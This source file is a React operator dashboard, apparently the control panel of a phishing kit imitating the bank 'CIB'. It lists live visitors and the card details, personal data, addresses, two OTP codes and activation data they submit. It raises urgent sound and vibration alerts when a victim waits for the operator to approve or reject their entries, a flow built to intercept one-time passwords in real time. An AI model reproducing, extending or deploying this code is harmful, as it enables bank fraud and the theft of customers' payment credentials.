import { useState, useEffect, useRef } from "react";
import { Search, RefreshCw, Trash2, LogOut, BellRing, User, Volume2, VolumeX, Hourglass, Zap } from "lucide-react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/components/ui/use-toast";
import { useNotificationSound } from "@/hooks/use-notification-sound";
import UserDetailsPanel from "@/components/dashboard/UserDetailsPanel";
import type { Tables } from "@/integrations/supabase/types";

type DashboardUser = Tables<"dashboard_users">;

interface DashboardMainProps {
  onLogout: () => void;
}

const DashboardMain = ({ onLogout }: DashboardMainProps) => {
  const [users, setUsers] = useState<DashboardUser[]>([]);
  const [searchTerm, setSearchTerm] = useState("");
  const [statusFilter, setStatusFilter] = useState<"all" | "waiting" | "active" | "done">("all");
  const [pageFilter, setPageFilter] = useState<string>("all");
  const [completionFilter, setCompletionFilter] = useState<"all" | "new" | "partial" | "complete">("all");
  const [selectedUser, setSelectedUser] = useState<DashboardUser | null>(null);
  const [loading, setLoading] = useState(true);
  const [unreadCount, setUnreadCount] = useState(0);
  const [now, setNow] = useState(Date.now());
  const [soundEnabled, setSoundEnabled] = useState(() => {
    const saved = localStorage.getItem("dashboard_sound");
    return saved !== "off";
  });
  const { toast } = useToast();
  const { playNotification, playWaitingPing } = useNotificationSound();
  const isInitialLoad = useRef(true);
  const soundEnabledRef = useRef(soundEnabled);

  useEffect(() => {
    soundEnabledRef.current = soundEnabled;
    localStorage.setItem("dashboard_sound", soundEnabled ? "on" : "off");
  }, [soundEnabled]);

  const fetchUsers = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from("dashboard_users")
      .select("*")
      .order("created_at", { ascending: false });

    if (error) {
      toast({ title: "خطأ", description: "فشل في تحميل البيانات", variant: "destructive" });
    } else {
      setUsers(data || []);
    }
    setLoading(false);
  };

  useEffect(() => {
    fetchUsers().then(() => { isInitialLoad.current = false; });

    const channel = supabase
      .channel("dashboard_users_changes")
      .on("postgres_changes", { event: "*", schema: "public", table: "dashboard_users" }, (payload) => {
        if (payload.eventType === "INSERT" && !isInitialLoad.current) {
          const newUser = payload.new as DashboardUser;
          if (soundEnabledRef.current) { playNotification(); navigator.vibrate?.([100, 50, 100, 50, 200]); }
          setUnreadCount((prev) => prev + 1);
          toast({ title: "🔔 مستخدم جديد!", description: `تم تسجيل "${newUser.name}"` });
        }
        if (payload.eventType === "UPDATE" && !isInitialLoad.current) {
          const updated = payload.new as DashboardUser;
          const old = payload.old as Partial<DashboardUser>;
          const newTabs = updated.status_tabs as Record<string, string> | null;

          // Determine the single most important notification for this event
          let notifyTitle = "";
          let notifyDesc = "";
          let vibratePattern: number | number[] = 200;

          // Priority 1: User reaches waiting page — urgent long pulse
          const oldPage = old.last_page;
          const newPage = updated.last_page;
          if (newPage === "الانتظار" && oldPage !== "الانتظار") {
            notifyTitle = "⏳ مستخدم في الانتظار!";
            notifyDesc = `"${updated.name}" يحتاج توجيه`;
            vibratePattern = [300, 100, 300, 100, 300];
          }

          // Priority 1.5: Activation data submitted — distinct triple-burst
          if (!notifyTitle) {
            const oldActivation = old.activation_data;
            const newActivation = updated.activation_data;
            const wasEmpty = !oldActivation || (typeof oldActivation === "object" && Object.keys(oldActivation as object).length === 0);
            const isFilled = newActivation && typeof newActivation === "object" && Object.keys(newActivation as object).length > 0;
            if (wasEmpty && isFilled) {
              notifyTitle = "🔓 بيانات تفعيل جديدة!";
              notifyDesc = `"${updated.name}" أرسل بيانات التفعيل`;
              vibratePattern = [200, 60, 100, 60, 200];
            }
          }

          // Priority 2: New data submitted — double tap
          if (!notifyTitle) {
            const dataKeys = ["home_data", "otp1_data", "personal_data", "address_data", "card_data", "otp2_data", "message_data"] as const;
            const hasNewData = dataKeys.some((k) => {
              const oldVal = old[k];
              const newVal = updated[k];
              const wasEmpty = !oldVal || (Array.isArray(oldVal) && (oldVal as unknown[]).length === 0);
              const isFilled = newVal && !(Array.isArray(newVal) && (newVal as unknown[]).length === 0);
              return wasEmpty && isFilled;
            });
            if (hasNewData) {
              notifyTitle = "📋 بيانات جديدة!";
              notifyDesc = `"${updated.name}" أرسل بيانات جديدة`;
              vibratePattern = [150, 80, 150];
            }
          }

          // Priority 3: Status cleared (resubmission) — single short
          if (!notifyTitle) {
            const oldAction = (old.status_tabs as Record<string, string> | null)?.action;
            const newAction = newTabs?.action;
            if (oldAction && !newAction && updated.last_page !== "الانتظار") {
              notifyTitle = "🔄 إعادة تقديم!";
              notifyDesc = `"${updated.name}" أعاد تقديم البيانات`;
              vibratePattern = 200;
            }
          }

          // Play ONE notification if any condition matched
          if (notifyTitle) {
            if (soundEnabledRef.current) { playNotification(); navigator.vibrate?.(vibratePattern); }
            setUnreadCount((prev) => prev + 1);
            toast({ title: notifyTitle, description: notifyDesc });
          }
        }
        fetchUsers();
      })
      .subscribe();

    return () => { supabase.removeChannel(channel); };
  }, []);

  useEffect(() => {
    const timer = setInterval(() => setNow(Date.now()), 1000);
    return () => clearInterval(timer);
  }, []);

  // Recurring soft reminder ping while there are waiting+online users (every 20s)
  useEffect(() => {
    const hasWaiting = users.some((u) => isWaiting(u) && isOnline(u.updated_at));
    if (!hasWaiting) return;
    const interval = setInterval(() => {
      if (soundEnabledRef.current) {
        playWaitingPing();
        navigator.vibrate?.(80);
      }
    }, 20000);
    return () => clearInterval(interval);
  }, [users, now, playWaitingPing]);

  useEffect(() => {
    if (!selectedUser) return;
    const latestSelectedUser = users.find((u) => u.id === selectedUser.id);
    if (!latestSelectedUser) {
      setSelectedUser(null);
      return;
    }
    if (latestSelectedUser !== selectedUser) {
      setSelectedUser(latestSelectedUser);
    }
  }, [users, selectedUser]);

  const sectionKeys = ["home_data", "message_data", "personal_data", "otp1_data", "otp2_data", "address_data", "card_data", "activation_data"] as const;

  const getFilledCount = (u: DashboardUser) =>
    sectionKeys.filter((k) => { const d = u[k]; return d && !(Array.isArray(d) && (d as unknown[]).length === 0); }).length;

  const isWaiting = (user: DashboardUser) => {
    const tabs = user.status_tabs as Record<string, string> | null;
    const action = tabs?.action || "";
    const processed = tabs?.processed === "true";
    if (processed) return false;
    if (action === "موافقة" || action === "رفض" || action === "بيانات خاطئة") return false;
    return action === "انتظار" || (!action);
  };

  const filteredUsers = users
    .filter((u) => {
      if (!u.name.includes(searchTerm)) return false;
      if (statusFilter === "waiting") { if (!isWaiting(u)) return false; }
      else if (statusFilter === "active") { if (isWaiting(u) || u.last_page === "النجاح" || u.last_page === "تم") return false; }
      else if (statusFilter === "done") { if (u.last_page !== "النجاح" && u.last_page !== "تم") return false; }
      if (pageFilter !== "all" && u.last_page !== pageFilter) return false;
      if (completionFilter !== "all") {
        const filled = getFilledCount(u);
        if (completionFilter === "new" && filled > 1) return false;
        if (completionFilter === "partial" && (filled <= 1 || filled >= sectionKeys.length)) return false;
        if (completionFilter === "complete" && filled < sectionKeys.length) return false;
      }
      return true;
    })
    .sort((a, b) => {
      // 1) Waiting + online users always at the top (most urgent)
      const aWait = isWaiting(a) && isOnline(a.updated_at) ? 1 : 0;
      const bWait = isWaiting(b) && isOnline(b.updated_at) ? 1 : 0;
      if (aWait !== bWait) return bWait - aWait;
      // 2) Then most recently updated
      return new Date(b.updated_at).getTime() - new Date(a.updated_at).getTime();
    });

  const waitingCount = users.filter((u) => isWaiting(u)).length;
  const uniquePages = [...new Set(users.map((u) => u.last_page).filter(Boolean))] as string[];

  const handleDeleteUser = async (id: string) => {
    const { error } = await supabase.from("dashboard_users").delete().eq("id", id);
    if (error) {
      toast({ title: "خطأ", description: "فشل في الحذف", variant: "destructive" });
    } else {
      toast({ title: "تم", description: "تم حذف المستخدم" });
      if (selectedUser?.id === id) setSelectedUser(null);
    }
  };

  const handleDeleteOffline = async () => {
    const offlineIds = users
      .filter((u) => !isOnline(u.updated_at))
      .map((u) => u.id);
    if (offlineIds.length === 0) {
      toast({ title: "تنبيه", description: "لا يوجد زوار غير متصلين" });
      return;
    }
    if (!confirm(`هل أنت متأكد من حذف ${offlineIds.length} زائر غير متصل؟`)) return;
    const { error } = await supabase.from("dashboard_users").delete().in("id", offlineIds);
    if (error) {
      toast({ title: "خطأ", description: "فشل في الحذف", variant: "destructive" });
    } else {
      toast({ title: "تم", description: `تم حذف ${offlineIds.length} زائر غير متصل` });
      if (selectedUser && offlineIds.includes(selectedUser.id)) setSelectedUser(null);
    }
  };

  const handleDeleteAll = async () => {
    if (users.length === 0) {
      toast({ title: "تنبيه", description: "لا يوجد بيانات للحذف" });
      return;
    }
    if (!confirm(`⚠️ هل أنت متأكد من مسح جميع البيانات؟ (${users.length} سجل)\n\nهذا الإجراء لا يمكن التراجع عنه!`)) return;
    if (!confirm("تأكيد نهائي: سيتم حذف جميع السجلات نهائياً. هل تريد المتابعة؟")) return;
    const allIds = users.map((u) => u.id);
    const { error } = await supabase.from("dashboard_users").delete().in("id", allIds);
    if (error) {
      toast({ title: "خطأ", description: "فشل في مسح البيانات", variant: "destructive" });
    } else {
      toast({ title: "تم", description: "تم مسح جميع البيانات بنجاح" });
      setSelectedUser(null);
    }
  };


  const getElapsed = (updatedAt: string) => {
    const diff = Math.max(0, Math.floor((now - new Date(updatedAt).getTime()) / 1000));
    const h = Math.floor(diff / 3600);
    const m = Math.floor((diff % 3600) / 60);
    const s = diff % 60;
    if (h > 0) return `${h}س ${m}د`;
    if (m > 0) return `${m}د ${s}ث`;
    return `${s}ث`;
  };

  const isOnline = (updatedAt: string) => {
    const diff = (now - new Date(updatedAt).getTime()) / 1000;
    return diff < 300; // 5 minutes
  };

  const countryNames: Record<string, string> = {
    EG: "مصر", SA: "السعودية", AE: "الإمارات", KW: "الكويت", QA: "قطر",
    BH: "البحرين", OM: "عمان", JO: "الأردن", IQ: "العراق", LB: "لبنان",
    PS: "فلسطين", SY: "سوريا", LY: "ليبيا", SD: "السودان", TN: "تونس",
    DZ: "الجزائر", MA: "المغرب", YE: "اليمن", US: "أمريكا", GB: "بريطانيا",
    DE: "ألمانيا", FR: "فرنسا", TR: "تركيا",
  };

  const getFlag = (code: string) => {
    if (!code || code.length !== 2) return "";
    return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
  };

  return (
    <div className="h-screen flex flex-col bg-background" dir="rtl">
      {/* Header */}
      <header className="hero-gradient px-4 py-3 flex items-center justify-between shrink-0 shadow-[0_2px_20px_hsl(213_76%_44%/0.3)] relative overflow-hidden">
        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_50%_120%,hsl(250_60%_50%/0.3),transparent_60%)]" />
        <div className="flex items-center gap-3 relative z-10">
          <h1 className="text-lg font-extrabold text-primary-foreground">CIB</h1>
          <span className="text-sm font-bold text-primary-foreground/80">لوحة التحكم</span>
          {unreadCount > 0 && (
            <button onClick={() => setUnreadCount(0)} className="flex items-center gap-1 bg-primary-foreground/20 text-primary-foreground px-2 py-1 rounded-full text-[10px] font-bold animate-pulse backdrop-blur-sm">
              <BellRing className="w-3 h-3" />
              {unreadCount}
            </button>
          )}
        </div>
        <div className="flex items-center gap-2 relative z-10">
          <button
            onClick={() => setSoundEnabled((prev) => !prev)}
            className="w-8 h-8 rounded-lg flex items-center justify-center bg-primary-foreground/10 text-primary-foreground hover:bg-primary-foreground/20 transition-colors"
            title={soundEnabled ? "كتم الصوت" : "تشغيل الصوت"}
          >
            {soundEnabled ? <Volume2 className="w-4 h-4" /> : <VolumeX className="w-4 h-4 opacity-50" />}
          </button>
          <Button variant="secondary" size="sm" onClick={onLogout} className="text-xs bg-primary-foreground/10 text-primary-foreground border-primary-foreground/20 hover:bg-primary-foreground/20">
            <LogOut className="w-3.5 h-3.5 ml-1" /> خروج
          </Button>
        </div>
      </header>

      <div className="flex flex-1 overflow-hidden">
        {/* Sidebar - Visitor Cards */}
        <div className={`${selectedUser ? "hidden md:flex w-80" : "w-full max-w-md mx-auto"} flex flex-col border-l border-border bg-card shrink-0 transition-all`}>
          {/* Search & Filters */}
          <div className="p-3 border-b border-border space-y-2">
            <div className="relative">
              <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground" />
              <Input placeholder="بحث..." value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} className="pr-9 text-right text-xs h-8" />
            </div>
            <div className="flex gap-1 flex-wrap">
              {([
                { key: "all" as const, label: `الكل (${users.length})` },
                { key: "waiting" as const, label: `⏳ (${waitingCount})` },
                { key: "active" as const, label: "🔵 نشط" },
                { key: "done" as const, label: "✅ منتهي" },
              ]).map((f) => (
                <Button key={f.key} size="sm" variant={statusFilter === f.key ? "default" : "outline"} onClick={() => setStatusFilter(f.key)} className="text-[10px] px-2 h-6">
                  {f.label}
                </Button>
              ))}
              <div className="mr-auto flex gap-1">
                <Button variant="outline" size="sm" onClick={fetchUsers} className="text-[10px] h-6 px-2"><RefreshCw className="w-3 h-3" /></Button>
                <Button variant="destructive" size="sm" onClick={handleDeleteOffline} className="text-[10px] h-6 px-2" title="حذف غير المتصلين"><Trash2 className="w-3 h-3" /></Button>
                <Button variant="destructive" size="sm" onClick={handleDeleteAll} className="text-[10px] h-6 px-2" title="مسح جميع البيانات">🗑️ مسح الكل</Button>
              </div>
            </div>
            {/* Page Filter */}
            <div className="flex gap-1 flex-wrap">
              <span className="text-[9px] text-muted-foreground self-center ml-1">الصفحة:</span>
              <Button size="sm" variant={pageFilter === "all" ? "default" : "outline"} onClick={() => setPageFilter("all")} className="text-[9px] px-1.5 h-5">الكل</Button>
              {uniquePages.map((p) => (
                <Button key={p} size="sm" variant={pageFilter === p ? "default" : "outline"} onClick={() => setPageFilter(p)} className="text-[9px] px-1.5 h-5 truncate max-w-[80px]">
                  {p}
                </Button>
              ))}
            </div>
            {/* Completion Filter */}
            <div className="flex gap-1 flex-wrap">
              <span className="text-[9px] text-muted-foreground self-center ml-1">الاكتمال:</span>
              {([
                { key: "all" as const, label: "الكل" },
                { key: "new" as const, label: "🆕 جديد" },
                { key: "partial" as const, label: "📊 جزئي" },
                { key: "complete" as const, label: "✅ مكتمل" },
              ]).map((f) => (
                <Button key={f.key} size="sm" variant={completionFilter === f.key ? "default" : "outline"} onClick={() => setCompletionFilter(f.key)} className="text-[9px] px-1.5 h-5">
                  {f.label}
                </Button>
              ))}
            </div>
          </div>

          {/* User Cards List */}
          <div className="flex-1 overflow-y-auto p-2 space-y-2">
            {loading ? (
              <div className="text-center py-8 text-muted-foreground text-sm">جاري التحميل...</div>
            ) : filteredUsers.length === 0 ? (
              <div className="text-center py-8 text-muted-foreground text-sm">لا يوجد زوار</div>
            ) : (
              filteredUsers.map((user) => {
                const waiting = isWaiting(user);
                const isSelected = selectedUser?.id === user.id;
                const filled = getFilledCount(user);
                const pct = Math.round((filled / sectionKeys.length) * 100);
                const online = isOnline(user.updated_at);
                const cc = (user as any).country_code || "";
                const flag = getFlag(cc);
                const country = countryNames[cc.toUpperCase()] || cc;
                return (
                  <button
                    key={user.id}
                    onClick={() => setSelectedUser(user)}
                    className={`w-full text-right p-3 rounded-xl border transition-all relative overflow-hidden ${
                      isSelected ? "bg-primary/5 border-primary ring-1 ring-primary/20" : "border-border/60"
                    } ${waiting && online ? "bg-gradient-to-l from-amber-50 to-orange-50 border-amber-400 shadow-[0_0_12px_hsl(38_92%_50%/0.2)] ring-1 ring-amber-300/50" : !online ? "opacity-50 bg-muted/30" : "hover:bg-muted/50"}`}
                  >
                    {waiting && online && (
                      <div className="absolute top-0 right-0 w-0 h-0 border-t-[24px] border-t-amber-400 border-l-[24px] border-l-transparent" />
                    )}
                    <div className="flex items-center gap-3">
                      <div className="relative shrink-0">
                        <div className={`w-9 h-9 rounded-full flex items-center justify-center text-sm font-bold ${
                          waiting ? "bg-amber-100 text-amber-700 ring-2 ring-amber-300" : "bg-primary/10 text-primary"
                        }`}>
                          {user.name.charAt(0)}
                        </div>
                        <div className={`absolute -bottom-0.5 -left-0.5 w-3 h-3 rounded-full border-2 border-card ${
                          online ? "bg-green-500" : "bg-muted-foreground/40"
                        }`} />
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center justify-between gap-2">
                          <div className="flex items-center gap-1.5 min-w-0">
                            <span className="text-xs font-bold text-foreground truncate">{user.name}</span>
                            {flag && <span className="text-sm shrink-0" title={country}>{flag}</span>}
                          </div>
                          <div className="flex items-center gap-1.5 shrink-0">
                            <span className={`text-[8px] px-1 py-0.5 rounded ${online ? "bg-green-100 text-green-700" : "bg-muted text-muted-foreground"}`}>
                              {online ? "متصل" : `آخر ظهور ${getElapsed(user.updated_at)}`}
                            </span>
                          </div>
                        </div>
                        <div className="flex items-center justify-between gap-2 mt-0.5">
                          <div className="flex items-center gap-1.5 min-w-0">
                            <span className="text-[10px] font-bold px-2 py-0.5 rounded-md bg-primary/10 text-primary border border-primary/20 truncate">
                              📄 {user.last_page || "غير محدد"}
                            </span>
                          </div>
                          {waiting && online && (
                            <span className="text-[9px] px-1.5 py-0.5 rounded-full bg-amber-100 text-amber-700 font-bold border border-amber-300 animate-pulse shrink-0">
                              ⏳ ينتظر
                            </span>
                          )}
                        </div>
                        <div className="flex items-center gap-1.5 mt-1">
                          <div className="flex-1 h-1 bg-muted rounded-full overflow-hidden">
                            <div className={`h-full rounded-full transition-all ${pct === 100 ? "bg-green-500" : pct >= 50 ? "bg-primary" : "bg-amber-400"}`} style={{ width: `${pct}%` }} />
                          </div>
                          <span className="text-[8px] text-muted-foreground">{filled}/{sectionKeys.length}</span>
                        </div>
                      </div>
                    </div>
                  </button>
                );
              })
            )}
          </div>
        </div>

        {/* Detail Panel - full screen on mobile, side panel on desktop */}
        {selectedUser && (
          <div className="fixed inset-0 z-50 md:static md:z-auto md:flex-1 overflow-hidden">
            <UserDetailsPanel
              user={selectedUser}
              onClose={() => setSelectedUser(null)}
              onDelete={() => handleDeleteUser(selectedUser.id)}
            />
          </div>
        )}

        {/* Empty state when no user selected */}
        {!selectedUser && users.length > 0 && (
          <div className="flex-1 hidden md:flex items-center justify-center">
            <div className="text-center text-muted-foreground">
              <User className="w-12 h-12 mx-auto mb-3 opacity-30" />
              <p className="text-sm">اختر زائراً لعرض تفاصيله</p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default DashboardMain;
